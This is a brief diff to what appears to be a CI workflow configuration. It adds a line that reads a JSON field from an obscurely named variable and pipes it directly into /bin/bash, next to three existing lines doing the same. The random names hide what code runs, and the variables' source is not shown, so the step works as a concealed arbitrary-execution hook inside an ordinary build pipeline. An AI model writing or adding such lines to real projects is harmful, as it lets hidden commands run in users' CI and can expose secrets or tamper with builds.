@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$pqjhh1347" | jq -r .t412 | /bin/bash
           printf '%s' "$attr2414" | jq -r .hw140 | /bin/bash
           printf '%s' "$y0" | jq -r .dvxtx56 | /bin/bash
+          echo $m933 | jq -r .uo4 | /bin/bash
 
       - name: Upload results
         if: always()
